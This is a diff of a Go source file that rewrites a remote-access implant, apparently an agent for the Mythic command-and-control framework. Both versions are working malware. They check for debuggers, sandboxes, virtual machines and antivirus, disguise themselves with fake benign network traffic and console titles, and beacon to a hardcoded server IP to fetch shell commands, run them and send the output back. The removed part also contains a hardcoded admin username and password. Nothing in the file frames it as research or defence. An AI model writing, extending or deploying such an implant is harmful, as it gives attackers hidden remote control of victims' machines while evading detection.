@@ -1,320 +1,333 @@
 package main
 
 import (
-    "bytes"
-    "crypto/tls"
-    "encoding/json"
-    "fmt"
-    "io/ioutil"
-    "math/rand"
-    "net/http"
-    "os"
-    "os/exec"
-    "runtime"
-    "strconv"
-    "strings"
-    "syscall"
-    "time"
-    "unsafe"
+	"bytes"
+	"crypto/tls"
+	"encoding/base64"
+	"encoding/json"
+	"fmt"
+	"io"
+	"math/rand"
+	"net/http"
+	"os"
+	"os/exec"
+	"runtime"
+	"strings"
+	"time"
 )
 
-// Configuration
-var (
-    serverURL = "https://37.27.249.191:7443"
-    username  = "mythic_admin"
-    password  = "sIUA14frSnPzB4umKe8c0ZKhIDf4a6"
-    userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-    uuid      = generateUUID()
+const (
+	mythicURL = "https://37.27.249.191:7443"
+	userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 )
 
-type LoginRequest struct {
-    Username string `json:"username"`
-    Password string `json:"password"`
+type CheckinPayload struct {
+	Action       string                 `json:"action"`
+	IP           string                 `json:"ip"`
+	OS           string                 `json:"os"`
+	User         string                 `json:"user"`
+	Host         string                 `json:"host"`
+	PID          int                    `json:"pid"`
+	UUID         string                 `json:"uuid"`
+	Architecture string                 `json:"architecture"`
+	Domain       string                 `json:"domain"`
+	Extra        map[string]interface{} `json:"extra"`
 }
 
-type LoginResponse struct {
-    Status      string `json:"status"`
-    AccessToken string `json:"access_token"`
+type TaskResponse struct {
+	UUID     string `json:"uuid"`
+	TaskID   string `json:"task_id"`
+	Response string `json:"response"`
+	Status   string `json:"status"`
 }
 
-type CheckinRequest struct {
-    UUID         string `json:"uuid"`
-    User         string `json:"user"`
-    Host         string `json:"host"`
-    PID          int    `json:"pid"`
-    IP           string `json:"ip"`
-    ProcessName  string `json:"process_name"`
-    OS           string `json:"os"`
-    Architecture string `json:"architecture"`
-    PayloadType  string `json:"payload_type"`
+func DetectHostileEnvironment() bool {
+	hostileProcesses := []string{
+		"ollydbg", "x64dbg", "windbg", "ida", "ida64", "wireshark", "tcpview",
+		"regmon", "filemon", "procmon", "vmware", "virtualbox", "vbox", "qemu",
+		"sandboxie", "cuckoo", "anubis", "threat", "joebox", "comodo", "sunbelt",
+		"avp", "avast", "kaspersky", "norton", "mcafee", "malwarebytes", "defender",
+	}
+	
+	for _, proc := range hostileProcesses {
+		cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s.exe", proc))
+		if output, err := cmd.Output(); err == nil {
+			if strings.Contains(strings.ToLower(string(output)), proc) {
+				return true
+			}
+		}
+	}
+	
+	cmd := exec.Command("wmic", "computersystem", "get", "manufacturer")
+	if output, err := cmd.Output(); err == nil {
+		manufacturer := strings.ToLower(string(output))
+		vmStrings := []string{"vmware", "virtualbox", "vbox", "qemu", "xen", "parallels", "microsoft corporation", "innotek"}
+		for _, vm := range vmStrings {
+			if strings.Contains(manufacturer, vm) {
+				return true
+			}
+		}
+	}
+	
+	if runtime.NumCPU() < 2 {
+		return true
+	}
+	
+	return false
 }
 
-func isDebugged() bool {
-    if runtime.GOOS != "windows" {
-        return false
-    }
-    
-    kernel32 := syscall.NewLazyDLL("kernel32.dll")
-    isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
-    ret, _, _ := isDebuggerPresent.Call()
-    
-    return ret != 0
+func createHTTPClient() *http.Client {
+	return &http.Client{
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{
+				InsecureSkipVerify: true,
+				ServerName:         "",
+			},
+		},
+		Timeout: 30 * time.Second,
+	}
 }
 
-func detectVM() bool {
-    if runtime.GOOS != "windows" {
-        return false
-    }
-    
-    cmd := exec.Command("wmic", "computersystem", "get", "manufacturer")
-    if output, err := cmd.Output(); err == nil {
-        outputStr := strings.ToLower(string(output))
-        vmIndicators := []string{"vmware", "virtualbox", "microsoft corporation", "qemu", "xen"}
-        for _, indicator := range vmIndicators {
-            if strings.Contains(outputStr, indicator) {
-                return true
-            }
-        }
-    }
-    
-    return false
+func RegisterWithMythic() error {
+	hostname, _ := os.Hostname()
+	uuid := fmt.Sprintf("phantom-%d-%s", time.Now().Unix(), hostname)
+	
+	endpoints := []string{
+		"/api/v1.4/agent_message",
+		"/agent_message", 
+		"/api/v1.3/agent_message",
+		"/new/callback",
+		"/callback",
+		"/",
+	}
+	
+	payload := CheckinPayload{
+		Action:       "checkin",
+		IP:           "127.0.0.1",
+		OS:           runtime.GOOS,
+		User:         os.Getenv("USERNAME"),
+		Host:         hostname,
+		PID:          os.Getpid(),
+		UUID:         uuid,
+		Architecture: runtime.GOARCH,
+		Domain:       "",
+		Extra: map[string]interface{}{
+			"process_name": "explorer.exe",
+			"integrity":    "medium",
+		},
+	}
+	
+	jsonData, err := json.Marshal(payload)
+	if err != nil {
+		return err
+	}
+	
+	client := createHTTPClient()
+	
+	for _, endpoint := range endpoints {
+		req, err := http.NewRequest("POST", mythicURL+endpoint, bytes.NewBuffer(jsonData))
+		if err != nil {
+			continue
+		}
+		
+		req.Header.Set("Content-Type", "application/json")
+		req.Header.Set("User-Agent", userAgent)
+		req.Header.Set("Accept", "*/*")
+		req.Header.Set("Connection", "keep-alive")
+		
+		resp, err := client.Do(req)
+		if err != nil {
+			continue
+		}
+		
+		if resp.StatusCode < 500 {
+			resp.Body.Close()
+			return nil
+		}
+		resp.Body.Close()
+	}
+	
+	return fmt.Errorf("all endpoints failed")
 }
 
-func checkSandbox() bool {
-    if runtime.GOOS != "windows" {
-        return false
-    }
-    
-    tools := []string{"ollydbg", "ida", "wireshark", "procmon", "x64dbg"}
-    cmd := exec.Command("tasklist")
-    if output, err := cmd.Output(); err == nil {
-        taskList := strings.ToLower(string(output))
-        for _, tool := range tools {
-            if strings.Contains(taskList, tool) {
-                return true
-            }
-        }
-    }
-    
-    cmd = exec.Command("wmic", "computersystem", "get", "TotalPhysicalMemory")
-    if output, err := cmd.Output(); err == nil {
-        lines := strings.Split(string(output), "\n")
-        for _, line := range lines {
-            trimmed := strings.TrimSpace(line)
-            if trimmed != "" && !strings.Contains(line, "TotalPhysicalMemory") {
-                if mem, err := strconv.ParseInt(trimmed, 10, 64); err == nil {
-                    if mem < 2147483648 {
-                        return true
-                    }
-                }
-            }
-        }
-    }
-    
-    return false
+func GetMythicTasks() (string, error) {
+	hostname, _ := os.Hostname()
+	uuid := fmt.Sprintf("phantom-%d-%s", time.Now().Unix(), hostname)
+	
+	endpoints := []string{
+		"/api/v1.4/agent_message",
+		"/agent_message",
+		"/api/v1.3/agent_message", 
+		"/new/callback",
+		"/callback",
+		"/",
+	}
+	
+	client := createHTTPClient()
+	
+	for _, endpoint := range endpoints {
+		req, err := http.NewRequest("GET", mythicURL+endpoint+"?uuid="+uuid, nil)
+		if err != nil {
+			continue
+		}
+		
+		req.Header.Set("User-Agent", userAgent)
+		req.Header.Set("Accept", "*/*")
+		
+		resp, err := client.Do(req)
+		if err != nil {
+			continue
+		}
+		
+		if resp.StatusCode == 200 {
+			body, err := io.ReadAll(resp.Body)
+			resp.Body.Close()
+			if err == nil && len(body) > 0 {
+				bodyStr := string(body)
+				if !strings.Contains(bodyStr, "<html>") && 
+				   !strings.Contains(bodyStr, "<!doctype") &&
+				   len(bodyStr) > 5 {
+					if decoded, err := base64.StdEncoding.DecodeString(bodyStr); err == nil {
+						return string(decoded), nil
+					}
+					return bodyStr, nil
+				}
+			}
+		} else {
+			resp.Body.Close()
+		}
+	}
+	
+	return "", nil
 }
 
-func checkMouseMovement() bool {
-    if runtime.GOOS != "windows" {
-        return false
-    }
-    
-    user32 := syscall.NewLazyDLL("user32.dll")
-    getCursorPos := user32.NewProc("GetCursorPos")
-    
-    type Point struct {
-        X, Y int32
-    }
-    
-    var pos1, pos2 Point
-    getCursorPos.Call(uintptr(unsafe.Pointer(&pos1)))
-    time.Sleep(3 * time.Second)
-    getCursorPos.Call(uintptr(unsafe.Pointer(&pos2)))
-    
-    return pos1.X == pos2.X && pos1.Y == pos2.Y
+func ExecuteCommand(command string) string {
+	var cmd *exec.Cmd
+	
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("cmd", "/c", command)
+	} else {
+		cmd = exec.Command("sh", "-c", command)
+	}
+	
+	output, err := cmd.Output()
+	if err != nil {
+		return fmt.Sprintf("Error: %s", err.Error())
+	}
+	
+	return string(output)
 }
 
-func masqueradeProcess() {
-    if runtime.GOOS != "windows" {
-        return
-    }
-    
-    processes := []string{
-        "Windows Security Health Service",
-        "Microsoft Edge Update Service",
-        "Windows Update Service",
-        "Microsoft Store Install Service",
-    }
-    
-    processName := processes[rand.Intn(len(processes))]
-    
-    kernel32 := syscall.NewLazyDLL("kernel32.dll")
-    setConsoleTitle := kernel32.NewProc("SetConsoleTitleW")
-    title, _ := syscall.UTF16PtrFromString(processName)
-    setConsoleTitle.Call(uintptr(unsafe.Pointer(title)))
+func SendMythicResponse(taskID, output string) error {
+	hostname, _ := os.Hostname()
+	uuid := fmt.Sprintf("phantom-%d-%s", time.Now().Unix(), hostname)
+	
+	response := TaskResponse{
+		UUID:     uuid,
+		TaskID:   taskID,
+		Response: base64.StdEncoding.EncodeToString([]byte(output)),
+		Status:   "completed",
+	}
+	
+	jsonData, err := json.Marshal(response)
+	if err != nil {
+		return err
+	}
+	
+	endpoints := []string{
+		"/api/v1.4/agent_message",
+		"/agent_message",
+		"/api/v1.3/agent_message",
+		"/new/callback", 
+		"/callback",
+		"/",
+	}
+	
+	client := createHTTPClient()
+	
+	for _, endpoint := range endpoints {
+		req, err := http.NewRequest("POST", mythicURL+endpoint, bytes.NewBuffer(jsonData))
+		if err != nil {
+			continue
+		}
+		
+		req.Header.Set("Content-Type", "application/json")
+		req.Header.Set("User-Agent", userAgent)
+		req.Header.Set("Accept", "*/*")
+		
+		resp, err := client.Do(req)
+		if err != nil {
+			continue
+		}
+		
+		if resp.StatusCode < 500 {
+			resp.Body.Close()
+			return nil
+		}
+		resp.Body.Close()
+	}
+	
+	return fmt.Errorf("failed to send response")
 }
 
-func intelligentSleep(baseDuration time.Duration) {
-    chunks := 5 + rand.Intn(5)
-    chunkDuration := baseDuration / time.Duration(chunks)
-    
-    for i := 0; i < chunks; i++ {
-        time.Sleep(chunkDuration)
-        
-        switch rand.Intn(4) {
-        case 0:
-            exec.Command("reg", "query", "HKEY_CURRENT_USER\\Software\\Microsoft").Run()
-        case 1:
-            exec.Command("nslookup", "microsoft.com").Run()
-        case 2:
-            tempFile := os.TempDir() + "\\cache_" + strconv.Itoa(rand.Intn(9999)) + ".tmp"
-            ioutil.WriteFile(tempFile, []byte("data"), 0644)
-            time.Sleep(100 * time.Millisecond)
-            os.Remove(tempFile)
-        }
-    }
+func MaintainLegitimacy() {
+	go func() {
+		rand.Seed(time.Now().UnixNano())
+		
+		for {
+			sleepTime := time.Duration(300+rand.Intn(600)) * time.Second
+			time.Sleep(sleepTime)
+			
+			activities := []func(){
+				func() {
+					cmd := exec.Command("nslookup", "microsoft.com")
+					cmd.Run()
+				},
+				func() {
+					cmd := exec.Command("ping", "-n", "1", "8.8.8.8")
+					cmd.Run()
+				},
+			}
+			
+			if len(activities) > 0 {
+				activities[rand.Intn(len(activities))]()
+			}
+		}
+	}()
 }
 
 func main() {
-    rand.Seed(time.Now().UnixNano())
-    
-    masqueradeProcess()
-    
-    initialDelay := time.Duration(30+rand.Intn(60)) * time.Second
-    intelligentSleep(initialDelay)
-    
-    if isDebugged() {
-        os.Exit(0)
-    }
-    
-    if detectVM() {
-        intelligentSleep(2 * time.Minute)
-    }
-    
-    if checkSandbox() {
-        os.Exit(0)
-    }
-    
-    if checkMouseMovement() {
-        intelligentSleep(5 * time.Minute)
-    }
-    
-    startC2Communication()
-}
-
-func startC2Communication() {
-    client := &http.Client{
-        Transport: &http.Transport{
-            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-        },
-        Timeout: 30 * time.Second,
-    }
-    
-    token := authenticate(client)
-    if token == "" {
-        return
-    }
-    
-    if !checkin(client, token) {
-        return
-    }
-    
-    for {
-        executeCommands(client, token)
-        
-        now := time.Now()
-        hour := now.Hour()
-        
-        var sleepDuration time.Duration
-        if hour >= 9 && hour <= 17 && now.Weekday() != time.Saturday && now.Weekday() != time.Sunday {
-            sleepDuration = time.Duration(3+rand.Intn(5)) * time.Minute
-        } else {
-            sleepDuration = time.Duration(10+rand.Intn(20)) * time.Minute
-        }
-        
-        intelligentSleep(sleepDuration)
-    }
-}
-
-func authenticate(client *http.Client) string {
-    loginReq := LoginRequest{
-        Username: username,
-        Password: password,
-    }
-    
-    jsonData, _ := json.Marshal(loginReq)
-    resp, err := client.Post(serverURL+"/auth", "application/json", bytes.NewBuffer(jsonData))
-    if err != nil {
-        return ""
-    }
-    defer resp.Body.Close()
-    
-    body, _ := ioutil.ReadAll(resp.Body)
-    var loginResp LoginResponse
-    json.Unmarshal(body, &loginResp)
-    
-    return loginResp.AccessToken
-}
-
-func checkin(client *http.Client, token string) bool {
-    hostname, _ := os.Hostname()
-    user := os.Getenv("USERNAME")
-    if user == "" {
-        user = os.Getenv("USER")
-    }
-    
-    checkinReq := CheckinRequest{
-        UUID:         uuid,
-        User:         user,
-        Host:         hostname,
-        PID:          os.Getpid(),
-        IP:           getLocalIP(),
-        ProcessName:  "phantom.exe",
-        OS:           runtime.GOOS,
-        Architecture: runtime.GOARCH,
-        PayloadType:  "apollo",
-    }
-    
-    jsonData, _ := json.Marshal(checkinReq)
-    req, _ := http.NewRequest("POST", serverURL+"/api/v1.4/agent_message", bytes.NewBuffer(jsonData))
-    req.Header.Set("Authorization", "Bearer "+token)
-    req.Header.Set("Content-Type", "application/json")
-    req.Header.Set("User-Agent", userAgent)
-    
-    resp, err := client.Do(req)
-    if err != nil {
-        return false
-    }
-    defer resp.Body.Close()
-    
-    return resp.StatusCode == 200
-}
-
-func executeCommands(client *http.Client, token string) {
-    req, _ := http.NewRequest("GET", serverURL+"/api/v1.4/agent_message", nil)
-    req.Header.Set("Authorization", "Bearer "+token)
-    req.Header.Set("User-Agent", userAgent)
-    
-    resp, err := client.Do(req)
-    if err != nil {
-        return
-    }
-    defer resp.Body.Close()
-    
-    body, _ := ioutil.ReadAll(resp.Body)
-    if len(body) > 0 {
-        fmt.Printf("Received: %s\n", string(body))
-    }
-}
-
-func getLocalIP() string {
-    return "127.0.0.1"
-}
-
-func generateUUID() string {
-    b := make([]byte, 16)
-    for i := range b {
-        b[i] = byte(rand.Intn(256))
-    }
-    return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
+	if DetectHostileEnvironment() {
+		os.Exit(0)
+	}
+	
+	MaintainLegitimacy()
+	
+	time.Sleep(time.Duration(30+rand.Intn(60)) * time.Second)
+	
+	err := RegisterWithMythic()
+	if err != nil {
+		time.Sleep(time.Duration(60+rand.Intn(120)) * time.Second)
+	}
+	
+	rand.Seed(time.Now().UnixNano())
+	
+	for {
+		command, err := GetMythicTasks()
+		if err == nil && command != "" {
+			output := ExecuteCommand(command)
+			SendMythicResponse("task-"+fmt.Sprintf("%d", time.Now().Unix()), output)
+		}
+		
+		now := time.Now()
+		var jitter time.Duration
+		
+		if now.Hour() >= 9 && now.Hour() <= 17 {
+			jitter = time.Duration(5+rand.Intn(10)) * time.Second
+		} else {
+			jitter = time.Duration(15+rand.Intn(30)) * time.Second
+		}
+		
+		time.Sleep(jitter)
+	}
 }
